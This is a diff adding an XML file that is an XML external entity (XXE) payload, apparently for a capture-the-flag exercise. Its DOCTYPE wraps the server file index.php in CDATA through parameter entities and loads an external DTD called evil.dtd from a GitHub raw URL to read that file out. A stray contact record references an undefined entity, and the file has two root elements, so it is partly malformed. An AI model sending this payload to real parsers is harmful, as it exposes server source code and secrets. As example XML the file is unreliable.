@@ -1,0 +1,26 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE roottag [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % goodies SYSTEM "index.php">
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/codemaa/testing/master/evil.dtd">
+%dtd;
+]>
+<roottag>&all;</roottag>
+
+<rss version="2.0">
+
+<contacts>
+  <contact>
+    <name>Jean &xxe; Dupont</name>
+    <phone>00 11 22 33 44</phone>
+    <adress>42 rue du CTF</adress>
+    <zipcode>75000</zipcode>
+    <city>Paris</city>
+  </contact>
+</contacts>
+
+</rss> 
+
+
+
